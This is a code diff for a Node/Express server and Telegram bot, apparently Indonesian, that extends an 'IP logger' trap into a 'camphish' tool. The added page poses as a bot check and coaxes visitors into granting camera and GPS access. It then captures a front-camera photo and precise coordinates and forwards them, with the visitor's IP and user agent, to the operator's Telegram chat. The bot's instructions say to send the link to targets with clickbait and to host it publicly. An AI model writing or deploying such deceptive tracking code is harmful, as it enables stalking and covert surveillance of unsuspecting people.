@@ -6,6 +6,7 @@ import util from "util";
 import { Telegraf, Markup } from "telegraf";
 import net from "net";
 import crypto from "crypto";
+import fs from "fs";
 
 const resolveMx = util.promisify(dns.resolveMx);
 
@@ -27,7 +28,31 @@ async function startServer() {
   const app = express();
   const PORT = 3000;
 
+  const TRAP_FILE = path.join(process.cwd(), 'trap_map.json');
   let trapMap = new Map<string, number>();
+  
+  // Load trapMap from file on startup
+  try {
+    if (fs.existsSync(TRAP_FILE)) {
+      const data = fs.readFileSync(TRAP_FILE, 'utf-8');
+      const parsed = JSON.parse(data);
+      trapMap = new Map<string, number>(Object.entries(parsed));
+      console.log(`Loaded ${trapMap.size} traps from disk.`);
+    }
+  } catch (e) {
+    console.error("Error loading trapMap:", e);
+  }
+
+  // Helper to save trapMap
+  const saveTrapMap = () => {
+    try {
+      const obj = Object.fromEntries(trapMap);
+      fs.writeFileSync(TRAP_FILE, JSON.stringify(obj, null, 2), 'utf-8');
+    } catch (e) {
+      console.error("Error saving trapMap:", e);
+    }
+  };
+
   // Default to the current AI Studio Dev URL. It will automatically update to Shared URL when someone visits it.
   let appHost = process.env.VITE_APP_URL || "https://ais-dev-wgiyctmskpzuuihqjrqsoy-125749415297.asia-southeast1.run.app";
 
@@ -138,7 +163,7 @@ async function startServer() {
     res.json({ username, results });
   });
 
-  // ========== IP LOGGER TRAP ENDPOINTS ==========
+  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
   app.get('/t/:id', (req, res) => {
     const id = req.params.id;
     const chatId = trapMap.get(id);
@@ -149,13 +174,93 @@ async function startServer() {
 
     if (process.env.TELEGRAM_BOT_TOKEN) {
       const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-      bot.telegram.sendMessage(chatId, `🚨 <b>TARGET TERKENA IP LOGGER!</b> 🚨\n\n` + 
+      bot.telegram.sendMessage(chatId, `🚨 <b>TARGET TERKENA IP LOGGER / CAMPHISH!</b> 🚨\n\n` + 
         `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
         `💻 <b>User-Agent:</b> <code>${userAgent}</code>\n\n` +
-        `<i>Sedang mencoba meminta akses GPS tingkat lanjut... Jika target menekan "Allow Location", Anda akan otomatis menerima koordinat GPS presisi tinggi.</i>`, {parse_mode: 'HTML'}).catch(()=>{});
+        `<i>Sedang mencoba meminta akses Kamera & GPS tingkat lanjut... Jika target menekan "Allow/Izinkan", bot akan otomatis mengirim foto target dan lokasi presisi.</i>`, {parse_mode: 'HTML'}).catch(()=>{});
     }
 
-    res.send(`<!DOCTYPE html><html><head><title>Verifikasi Keamanan</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background:#121212; color:#fff; font-family:-apple-system, sans-serif; text-align:center; padding-top:20vh; margin:0;} .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;} @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></head><body><div class="loader"></div><h2>Memverifikasi Koneksi Aman...</h2><p style="color:#aaa; font-size:14px; padding:0 20px;">Browser Anda sedang meminta akses lokasi untuk memverifikasi bahwa Anda bukan botnet. Mohon tekan <b>"Allow/Izinkan"</b> jika ada pop-up untuk melanjutkan.</p><script>setTimeout(() => { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition( (pos) => { fetch('/api/log/${id}/gps', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) }).then(() => window.location.href = 'https://google.com'); }, (err) => { window.location.href = 'https://google.com'; }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } ); } else { window.location.href = 'https://google.com'; } }, 500);</script></body></html>`);
+    // Serve HTML payload for tracking (Cam + GPS)
+    res.send(`<!DOCTYPE html><html><head><title>Verifikasi Keamanan</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { background:#121212; color:#fff; font-family:-apple-system, sans-serif; text-align:center; padding-top:20vh; margin:0;} .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;} @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></head><body><div class="loader"></div><h2>Memverifikasi Koneksi Aman...</h2><p style="color:#aaa; font-size:14px; padding:0 20px;">Sistem sedang memverifikasi bahwa Anda bukan robot. Mohon tekan <b>"Allow/Izinkan"</b> jika muncul pop-up Kamera/Lokasi untuk melanjutkan.</p>
+    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+      let gpsSent = false;
+      let camSent = false;
+      let totalTime = 0;
+      
+      const checkRedirect = () => {
+        if(totalTime >= 5 && (camSent || gpsSent || totalTime >= 8)) {
+          window.location.href = 'https://google.com';
+        }
+      };
+
+      setInterval(() => { totalTime++; checkRedirect(); }, 1000);
+
+      // 1. Capture Camera
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+          .then(function(stream) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(() => {
+              const canvas = document.getElementById('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              
+              const imgData = canvas.toDataURL('image/jpeg', 0.8);
+              
+              fetch('/api/log/${id}/cam', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imgData })
+              }).then(() => { camSent = true; checkRedirect(); });
+              
+              stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+          })
+          .catch(function(err) {
+            console.log("Kamera tidak diizinkan.");
+            camSent = true; checkRedirect();
+          });
+      } else { camSent = true; }
+
+      // 2. Capture GPS
+      setTimeout(() => { 
+        if (navigator.geolocation) { 
+          navigator.geolocation.getCurrentPosition( 
+            (pos) => { 
+              fetch('/api/log/${id}/gps', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
+              }).then(() => { gpsSent = true; checkRedirect(); }); 
+            }, 
+            (err) => { gpsSent = true; checkRedirect(); }, 
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } 
+          ); 
+        } else { gpsSent = true; checkRedirect(); } 
+      }, 500);
+    </script></body></html>`);
+  });
+
+  // Handle Camphish Image Upload
+  app.post('/api/log/:id/cam', express.json({limit: '10mb'}), (req, res) => {
+    const id = req.params.id;
+    const chatId = trapMap.get(id);
+    if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
+      const { image } = req.body;
+      if (image && typeof image === 'string') {
+        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
+        const imageBuffer = Buffer.from(base64Data, 'base64');
+        const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
+        bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { caption: `📸 <b>FOTO TARGET (CAMPHISH)</b> 🚨\n\nTarget telah menekan "Allow" pada kamera.`, parse_mode: 'HTML' }).catch(console.error);
+      }
+    }
+    res.sendStatus(200);
   });
 
   app.post('/api/log/:id/gps', express.json(), (req, res) => {
@@ -351,14 +456,11 @@ async function startServer() {
     });
 
     bot.command('logger', (ctx) => {
-      if (appHost.includes('localhost') || appHost.includes('127.0.0.1')) {
-        return ctx.reply("⚠️ <b>HOST BELUM DIATUR! (ERROR LOCALHOST)</b> ⚠️\n\nBot tidak bisa membuat link karena menggunakan Host Lokal.\n\n<b>Cara Mengatasi:</b>\n1. Buka/Refresh halaman web app ini di browser Anda sekali (agar sistem auto-deteksi URL asli), <b>ATAU</b>\n2. Atur manual dengan membalas pesan ini menggunakan:\n<code>/sethost https://ais-dev-...run.app</code>", {parse_mode: 'HTML'});
-      }
-
       const id = crypto.randomUUID().slice(0, 8);
       trapMap.set(id, ctx.chat.id);
+      saveTrapMap();
       const trapUrl = `${appHost.replace(/\/$/, '')}/t/${id}`;
-      ctx.reply(`🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\nLink Pelacak Anda:\n<code>${trapUrl}</code>\n\n<b>Cara Penggunaan:</b>\n1. Copy link di atas dan kirimkan ke target dengan dalih/clickbait.\n2. Saat target <b>membuka link (Klik)</b>, Anda otomatis mendapat IP Address target di chat ini.\n3. Jika target membiarkan halaman loading & menekan <b>"Allow/Izinkan Location"</b>, Anda akan menerima <b>LOKASI GPS PRESISI MAX!</b> 🗺️\n\n<i>Note: Jika link masih error 404, pastikan URL web app Anda benar dengan command /sethost. Jika Anda melihat layar putih atau "Problem Loading", web app di belakang mungkin sedang offline atau pause, buka url utama aplikasi ini terlebih dahulu agar aktif.</i>`, {parse_mode: 'HTML', disable_web_page_preview: true});
+      ctx.reply(`🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\nLink Pelacak Anda:\n<code>${trapUrl}</code>\n\n<b>Cara Penggunaan:</b>\n1. Copy link di atas dan kirimkan ke target dengan dalih/clickbait (contoh: "Eh liat foto lucu ini").\n2. Saat target <b>membuka link (Klik)</b>, Anda otomatis mendapat IP Address target di chat ini.\n3. Jika target membiarkan halaman loading & menekan <b>"Allow/Izinkan Location"</b>, Anda akan menerima <b>LOKASI GPS PRESISI MAX!</b> 🗺️\n\n<i>Note: Karena link bawaan AI Studio tidak bisa diakses target (butuh Google Login), <b>sangat disarankan deploy kode ini ke Railway/Vercel</b> lalu ketik command <code>/sethost https://domain-publik-anda.com</code> pada bot ini!</i>`, {parse_mode: 'HTML', disable_web_page_preview: true});
     });
 
     bot.command('ip', async (ctx) => {
